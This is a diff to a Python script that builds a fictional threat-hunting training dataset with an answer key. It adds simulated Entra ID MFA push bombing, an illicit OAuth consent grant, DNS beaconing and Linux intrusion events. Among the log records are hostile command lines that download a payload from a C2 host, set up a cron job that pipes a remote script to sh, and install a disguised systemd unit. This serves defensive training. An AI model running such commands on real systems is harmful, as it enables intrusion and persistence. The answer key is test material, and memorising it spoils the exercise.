@@ -12,6 +12,11 @@ Output (written next to this script, under ./lab):
   sysmon/registry_set.jsonl       Sysmon EID 13  (Sigma registry_set / SPL)
   sysmon/network_connection.jsonl Sysmon EID 3   (SPL / pivots)
   security/security.jsonl         Security 4624 / 4769 (Sigma service: security / SPL)
+  sysmon/dns_query.jsonl          Sysmon EID 22  (Sigma dns_query / SPL)
+  linux/process_creation.jsonl    Sysmon for Linux EID 1 (Sigma linux process_creation / SPL)
+  entra/signinlogs.jsonl          Entra ID sign-ins, flattened (Sigma azure signinlogs / SPL)
+  entra/auditlogs.jsonl           Entra ID audit log, flattened (Sigma azure auditlogs / SPL)
+  sentinel/SigninLogs.csv, AuditLogs.csv, DnsEvents.csv   Sentinel schemas (KQL)
   mde/DeviceProcessEvents.csv     Defender XDR schema (KQL)
   mde/DeviceRegistryEvents.csv
   mde/DeviceNetworkEvents.csv
@@ -68,7 +73,8 @@ SYS32 = r"C:\Windows\System32"
 PS = SYS32 + r"\WindowsPowerShell\v1.0\powershell.exe"
 
 proc_events, reg_events, net_events, sec_events = [], [], [], []
-truth = {f"HL-{n:04d}": {"malicious": [], "benign_match": []} for n in range(1, 11)}
+signin_events, audit_events, linux_events, dns_events = [], [], [], []
+truth = {f"HL-{n:04d}": {"malicious": [], "benign_match": []} for n in range(1, 15)}
 
 
 def ts(day, hh, mm, ss=None):
@@ -342,6 +348,144 @@ for host, base in (("SRV-FILE-01", 0), ("SRV-BKP-01", 5)):
     proc(ts(3, 2, t0 + 12), host, f"{STAGE}\\svchost.exe", f"{STAGE}\\svchost.exe -p \\\\{host}\\D$ -nomutex",
          SYS32 + r"\cmd.exe", r"cmd.exe /c C:\ProgramData\svcupd\kill.bat", user=SB)  # the encryptor - no hunt matches it directly; found by pivoting
 
+
+# --------------------------------------------------------------------------- v1.1: cloud identity, Linux, DNS
+# Appended after the v1.0 events so the original event IDs and answer key stay stable.
+OFFICE_IP = "198.51.100.10"      # corporate egress NAT
+ATTACKER_IP = "203.0.113.99"     # anonymizing VPN exit used by the affiliate
+UPN = lambda u: f"{u}@lab.example"
+APPS_365 = ["Office 365 Exchange Online", "Microsoft Teams", "OfficeHome", "SharePoint Online", "Microsoft Edge"]
+RESULT_TEXT = {0: "", 50126: "Invalid username or password or Invalid on-premise username or password.",
+               50074: "Strong Authentication is required.",
+               500121: "Authentication failed during strong authentication request."}
+
+
+def signin(t, user, ip, result, app=None, location="US", auth_req="multiFactorAuthentication", detail="", tags=()):
+    signin_events.append(dict(_t=t, _tags=list(tags), UserPrincipalName=UPN(user), AppDisplayName=app or rnd.choice(APPS_365),
+                              IPAddress=ip, Location=location, ResultType=result, ResultDescription=RESULT_TEXT[result],
+                              AuthenticationRequirement=auth_req, AuthenticationMethod="Mobile app notification",
+                              AuthenticationDetail=detail, ClientAppUsed="Browser",
+                              ConditionalAccessStatus="success" if result == 0 else "notApplied"))
+
+
+def consent(t, user, ip, app_name, app_id, scopes, admin=False, verified=False, op="Consent to application", tags=()):
+    audit_events.append(dict(_t=t, _tags=list(tags), OperationName=op, Category="ApplicationManagement", Result="success",
+                             InitiatedBy=UPN(user), InitiatedByIp=ip, TargetAppName=app_name, TargetAppId=app_id,
+                             ConsentPermissions=scopes, IsAdminConsent=admin, PublisherVerified=verified))
+
+
+def lproc(t, host, image, cmd, parent, user="root", tags=()):
+    linux_events.append(dict(_t=t, _tags=list(tags), Computer=f"{host.lower()}.lab.example", Image=image, CommandLine=cmd,
+                             ParentImage=parent, User=user, ProcessId=rnd.randint(1000, 60000)))
+
+
+def dnsq(t, host, image, name, qtype="A", tags=()):
+    dns_events.append(dict(_t=t, _tags=list(tags), Computer=FQDN(host), Image=image, QueryName=name, QueryType=qtype,
+                           QueryStatus=0, User=f"{DOMAIN}\\{USERS.get(host, 'SYSTEM')}"))
+
+
+# Entra ID sign-ins: daily office sign-ins, a few typos, one-off accidental denials, one user with a lost phone
+for host, u in USERS.items():
+    for day in range(DAYS):
+        if rnd.random() < 0.85:
+            signin(ts(day, rnd.randint(7, 9), rnd.randint(0, 59)), u, OFFICE_IP, 0)
+        if rnd.random() < 0.08:
+            signin(ts(day, rnd.randint(9, 17), rnd.randint(0, 59)), u, OFFICE_IP, 50126, auth_req="singleFactorAuthentication")
+for u in rnd.sample(sorted(set(USERS.values()) - {"jmiller"}), 4):
+    signin(rand_time(), u, OFFICE_IP, 500121, detail="MFA denied; user declined the authentication",
+           tags=[("HL-0012", B, "Single MFA denial from the office IP (accidental tap or stale prompt), no burst")])
+LOST = "user05"
+for i in range(3):
+    signin(ts(3, 8, 10 + i * 4), LOST, OFFICE_IP, 500121, detail="MFA denied; user did not respond to the authentication request",
+           tags=[("HL-0012", B, "user05 replaced phone: 3 timeouts from office IP, then help desk re-registered MFA")])
+signin(ts(3, 8, 40), LOST, OFFICE_IP, 0)
+
+# Attack day 1 (Oct 6, evening): password from an earlier phish, then push bombing until jmiller approves
+for i in range(14):
+    signin(ts(1, 23, 31 + i), "jmiller", ATTACKER_IP, 500121, app="OfficeHome", location="NL",
+           detail="MFA denied; user declined the authentication",
+           tags=[("HL-0012", M, "MFA push bombing of jmiller from anonymizing VPN (203.0.113.99)")])
+signin(ts(1, 23, 47), "jmiller", ATTACKER_IP, 0, app="OfficeHome", location="NL")
+
+# Entra ID audit: routine consents and an approved backup app (admin consent), then the illicit consent grant
+for u in rnd.sample(sorted(set(USERS.values())), 9):
+    consent(rand_time(), u, OFFICE_IP, "Zoom", "f2a9c1e4-0f36-4b7a-9a43-1d2e8c7b5a10", "openid profile email offline_access User.Read",
+            verified=True)
+for u in rnd.sample(sorted(set(USERS.values())), 4):
+    consent(rand_time(), u, OFFICE_IP, "Calendly", "6b0e1d9f-3c4a-4e57-8d21-90f7a2b4c3e8", "User.Read Calendars.ReadWrite offline_access",
+            verified=True)
+consent(ts(0, 15, 12), "admin_tlee", OFFICE_IP, "Northwind Backup for M365",
+        "3c7d5a2e-8b14-4f90-a6c3-5e1f0d9b7a24", "Mail.Read Files.Read.All Sites.Read.All offline_access", admin=True, verified=True,
+        tags=[("HL-0011", B, "Admin consent (admin_tlee) to the sanctioned M365 backup app, verified publisher, change ticket")])
+for _ in range(25):
+    audit_events.append(dict(_t=rand_time(), _tags=[], OperationName=rnd.choice(["Update user", "Add member to group", "Reset user password"]),
+                             Category="UserManagement", Result="success", InitiatedBy=UPN(rnd.choice(ADMINS)),
+                             InitiatedByIp=OFFICE_IP, TargetAppName="", TargetAppId="", ConsentPermissions="",
+                             IsAdminConsent=False, PublisherVerified=False))
+EVIL_APP = "9e3b7c1a-55d2-4f0e-b8a4-7c6d2e1f0a93"
+consent(ts(1, 23, 51), "jmiller", ATTACKER_IP, "Remittance Viewer", EVIL_APP, "", op="Add service principal")
+consent(ts(1, 23, 52), "jmiller", ATTACKER_IP, "Remittance Viewer", EVIL_APP,
+        "User.Read Mail.Read Files.Read.All offline_access", tags=[("HL-0011", M, "Illicit consent grant: unverified app, mailbox + file scopes, from attacker VPN IP")])
+
+# Linux servers: NAS and web. Routine admin noise, config management, a health-check cron, then the affiliate
+LNX = {"LNX-NAS-01": "10.10.10.80", "LNX-WEB-02": "10.10.10.81"}
+for _ in range(220):
+    host = rnd.choice(list(LNX))
+    image, cmd, parent, user = rnd.choice([
+        ("/usr/bin/bash", "-bash", "/usr/sbin/sshd", "admin_rgomez"),
+        ("/usr/bin/ls", "ls -la /volume1/backups", "/usr/bin/bash", "admin_rgomez"),
+        ("/usr/bin/rsync", "rsync -a --delete /volume1/exports/ /volume2/mirror/", "/usr/sbin/cron", "root"),
+        ("/usr/sbin/logrotate", "/usr/sbin/logrotate /etc/logrotate.conf", "/usr/sbin/cron", "root"),
+        ("/usr/bin/apt-get", "apt-get -qq update", "/usr/bin/bash", "root"),
+        ("/usr/bin/systemctl", "systemctl status nginx", "/usr/bin/bash", "admin_rgomez"),
+        ("/usr/bin/df", "df -h", "/usr/bin/bash", "admin_rgomez"),
+    ])
+    lproc(rand_time(), host, image, cmd, parent, user)
+lproc(ts(0, 10, 5), "LNX-WEB-02", "/usr/bin/sh",
+      "sh -c \"echo '0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew' > /etc/cron.d/certbot\"", "/usr/bin/dpkg")
+for host in LNX:
+    lproc(ts(1, 14, 2), host, "/usr/bin/cp",
+          "cp /tmp/ansible-tmp-1759755720.41-8812/source /etc/systemd/system/node_exporter.service", "/usr/bin/python3",
+          tags=[("HL-0013", B, "Ansible deploying node_exporter unit from its /tmp staging dir (python3 parent, change window, both hosts)")])
+lproc(ts(2, 16, 30), "LNX-NAS-01", "/usr/bin/sh",
+      "sh -c \"echo '*/10 * * * * root curl -fsS -m 10 https://healthchecks.lab.example/ping/nas-backup' >> /etc/crontab\"",
+      "/usr/bin/bash", tags=[("HL-0013", B, "Backup heartbeat cron calling the internal healthchecks.lab.example URL")])
+
+# Oct 8: affiliate pivots from SRV-BKP-01 to the NAS over SSH as root (password reused from svc_backup vault entry)
+lproc(ts(3, 1, 33), "LNX-NAS-01", "/usr/bin/bash", "-bash", "/usr/sbin/sshd")
+lproc(ts(3, 1, 34), "LNX-NAS-01", "/usr/bin/wget", f"wget -q http://{C2}/l -O /dev/shm/.nwcache/dbus-cached", "/usr/bin/bash")
+lproc(ts(3, 1, 35), "LNX-NAS-01", "/usr/bin/sh",
+      f"sh -c \"echo '*/10 * * * * root curl -fsSL http://{C2}/n.sh | sh' > /etc/cron.d/nwcache\"", "/usr/bin/bash",
+      tags=[("HL-0013", M, "Cron entry piping a remote script from the C2 server to sh every 10 minutes")])
+lproc(ts(3, 1, 36), "LNX-NAS-01", "/usr/bin/sh",
+      "sh -c \"printf '[Unit]\\nDescription=D-Bus cache\\n[Service]\\nExecStart=/dev/shm/.nwcache/dbus-cached\\nRestart=always\\n"
+      "[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/dbus-cache.service\"", "/usr/bin/bash",
+      tags=[("HL-0013", M, "Masquerading systemd unit executing a binary from /dev/shm")])
+lproc(ts(3, 1, 37), "LNX-NAS-01", "/usr/bin/systemctl", "systemctl enable --now dbus-cache.service", "/usr/bin/bash")
+lproc(ts(3, 2, 20), "LNX-NAS-01", "/dev/shm/.nwcache/dbus-cached", "/dev/shm/.nwcache/dbus-cached --path /volume1 --ext .qledger",
+      "/usr/lib/systemd/systemd")  # Linux encryptor - found by pivoting, no hunt matches it
+
+# DNS: normal browsing, AV hash-reputation lookups (long labels), then the implant's DNS beacon
+NORMAL_DNS = ["www.bing.com", "outlook.office365.com", "login.microsoftonline.com", "teams.microsoft.com", "github.com",
+              "update.googleapis.com", "settings-win.data.microsoft.com", "news.example.com", "lab.example", "srv-file-01.lab.example"]
+CHROME = APPS[0][0]
+for _ in range(1500):
+    host = rnd.choice(list(WORKSTATIONS))
+    dnsq(rand_time(), host, CHROME, rnd.choice(NORMAL_DNS))
+AV = r"C:\Program Files\NorthShield\nsagent.exe"
+for _ in range(60):
+    host = rnd.choice(list(WORKSTATIONS))
+    dnsq(rand_time(), host, AV, f"{rnd.getrandbits(160):040x}.rep.northshield.example", "TXT",
+         tags=[("HL-0014", B, "NorthShield AV file-reputation lookups: signed AV agent, many hosts, irregular timing")])
+B32 = "abcdefghijklmnopqrstuvwxyz234567"
+beacon_t = START + timedelta(days=2, hours=9, minutes=25)
+end_t = START + timedelta(days=3, hours=2, minutes=30)
+IMPLANT = r"C:\Users\jmiller\AppData\Roaming\Microsoft\odupd.exe"
+while beacon_t < end_t:
+    dnsq(beacon_t, V, IMPLANT, "".join(rnd.choice(B32) for _ in range(32)) + ".t.cdn-sync-telemetry.example", "TXT",
+         tags=[("HL-0014", M, "Implant DNS beacon: ~300 s interval, unique base32 label per query, TXT")])
+    beacon_t += timedelta(seconds=300 + rnd.randint(-15, 15))
+
 # --------------------------------------------------------------------------- write outputs
 def iso(t):
     return t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z"
@@ -355,7 +499,8 @@ def finalize(events, prefix):
             truth[hunt][kind].append({"id": e["LabEventId"], "note": note})
 
 
-for evs, p in ((proc_events, "P"), (reg_events, "R"), (net_events, "N"), (sec_events, "S")):
+for evs, p in ((proc_events, "P"), (reg_events, "R"), (net_events, "N"), (sec_events, "S"),
+               (signin_events, "E"), (audit_events, "A"), (linux_events, "L"), (dns_events, "D")):
     finalize(evs, p)
 
 
@@ -441,6 +586,65 @@ write_csv(OUT / "sentinel/SecurityEvent.csv", [dict(
     ["TimeGenerated", "Computer", "EventID", "Account", "TargetUserName", "TargetDomainName", "ServiceName",
      "TicketEncryptionType", "TicketOptions", "Status", "IpAddress", "LogonType", "WorkstationName", "LabEventId"])
 
+# v1.1 outputs
+def strip(e):
+    return {k: v for k, v in e.items() if not k.startswith("_")}
+
+
+write_jsonl(OUT / "sysmon/dns_query.jsonl", [dict(UtcTime=iso(e["_t"]), EventID=22, EventCode=22,
+            Channel="Microsoft-Windows-Sysmon/Operational", **strip(e)) for e in dns_events])
+write_jsonl(OUT / "linux/process_creation.jsonl", [dict(UtcTime=iso(e["_t"]), EventID=1, EventCode=1,
+            Channel="Linux-Sysmon/Operational", **strip(e)) for e in linux_events])
+write_jsonl(OUT / "entra/signinlogs.jsonl", [dict(UtcTime=iso(e["_t"]), **strip(e)) for e in signin_events])
+write_jsonl(OUT / "entra/auditlogs.jsonl", [dict(UtcTime=iso(e["_t"]), **strip(e)) for e in audit_events])
+
+write_csv(OUT / "sentinel/SigninLogs.csv", [dict(
+    TimeGenerated=iso(e["_t"]), UserPrincipalName=e["UserPrincipalName"], AppDisplayName=e["AppDisplayName"],
+    IPAddress=e["IPAddress"], Location=e["Location"], ResultType=str(e["ResultType"]), ResultDescription=e["ResultDescription"],
+    AuthenticationRequirement=e["AuthenticationRequirement"], ClientAppUsed=e["ClientAppUsed"],
+    ConditionalAccessStatus=e["ConditionalAccessStatus"],
+    AuthenticationDetails=json.dumps([{"authenticationMethod": e["AuthenticationMethod"],
+                                       "succeeded": e["ResultType"] == 0,
+                                       "authenticationStepResultDetail": e["AuthenticationDetail"] or
+                                       ("MFA successfully completed" if e["ResultType"] == 0 else e["ResultDescription"])}]),
+    LabEventId=e["LabEventId"]) for e in signin_events],
+    ["TimeGenerated", "UserPrincipalName", "AppDisplayName", "IPAddress", "Location", "ResultType", "ResultDescription",
+     "AuthenticationRequirement", "ClientAppUsed", "ConditionalAccessStatus", "AuthenticationDetails", "LabEventId"])
+
+
+def target_resources(e):
+    if not e["TargetAppName"]:
+        return json.dumps([{"displayName": "user", "type": "User", "modifiedProperties": []}])
+    props = []
+    if e["OperationName"] == "Consent to application":
+        props = [{"displayName": "ConsentContext.IsAdminConsent", "oldValue": None, "newValue": f'"{e["IsAdminConsent"]}"'},
+                 {"displayName": "ConsentAction.Permissions", "oldValue": None,
+                  "newValue": f'"[] => [[Id: lab, ClientId: {e["TargetAppId"]}, ConsentType: '
+                              f'{"AllPrincipals" if e["IsAdminConsent"] else "Principal"}, Scope: {e["ConsentPermissions"]}, ]];"'},
+                 {"displayName": "TargetId.ServicePrincipalNames", "oldValue": None, "newValue": f'"{e["TargetAppId"]}"'}]
+    return json.dumps([{"displayName": e["TargetAppName"], "id": e["TargetAppId"], "type": "ServicePrincipal",
+                        "modifiedProperties": props}])
+
+
+write_csv(OUT / "sentinel/AuditLogs.csv", [dict(
+    TimeGenerated=iso(e["_t"]), OperationName=e["OperationName"], Category=e["Category"], Result=e["Result"],
+    InitiatedBy=json.dumps({"user": {"userPrincipalName": e["InitiatedBy"], "ipAddress": e["InitiatedByIp"]}}),
+    TargetResources=target_resources(e), LabEventId=e["LabEventId"]) for e in audit_events],
+    ["TimeGenerated", "OperationName", "Category", "Result", "InitiatedBy", "TargetResources", "LabEventId"])
+
+write_csv(OUT / "sentinel/DnsEvents.csv", [dict(
+    TimeGenerated=iso(e["_t"]), Computer=FQDN("SRV-DC-01"), ClientIP=HOSTS[short(e["Computer"])], Name=e["QueryName"],
+    QueryType=e["QueryType"], SubType="LookupQuery", ResultCode=0, LabEventId=e["LabEventId"]) for e in dns_events],
+    ["TimeGenerated", "Computer", "ClientIP", "Name", "QueryType", "SubType", "ResultCode", "LabEventId"])
+
+write_csv(OUT / "mde/DeviceProcessEvents_Linux.csv", [dict(
+    Timestamp=iso(e["_t"]), DeviceName=e["Computer"], ActionType="ProcessCreated", FileName=e["Image"].rsplit("/", 1)[-1],
+    FolderPath=e["Image"], ProcessCommandLine=e["CommandLine"], AccountName=e["User"],
+    InitiatingProcessFileName=e["ParentImage"].rsplit("/", 1)[-1], InitiatingProcessFolderPath=e["ParentImage"],
+    ProcessId=e["ProcessId"], ReportId=e["LabEventId"]) for e in linux_events],
+    ["Timestamp", "DeviceName", "ActionType", "FileName", "FolderPath", "ProcessCommandLine", "AccountName",
+     "InitiatingProcessFileName", "InitiatingProcessFolderPath", "ProcessId", "ReportId"])
+
 KEY.write_text(json.dumps({
     "_readme": "Ground truth for the lab dataset. Facilitators only - do not share with attendees before the debrief.",
     "scenario": "Operation Quiet Ledger (fictional)",
@@ -449,6 +653,7 @@ KEY.write_text(json.dumps({
     "hunts": truth,
 }, indent=2) + "\n")
 
-print(f"process={len(proc_events)} registry={len(reg_events)} network={len(net_events)} security={len(sec_events)}")
+print(f"process={len(proc_events)} registry={len(reg_events)} network={len(net_events)} security={len(sec_events)} "
+      f"signin={len(signin_events)} audit={len(audit_events)} linux={len(linux_events)} dns={len(dns_events)}")
 for h, v in truth.items():
     print(f"{h}: malicious={len(v['malicious'])} benign_match={len(v['benign_match'])}")
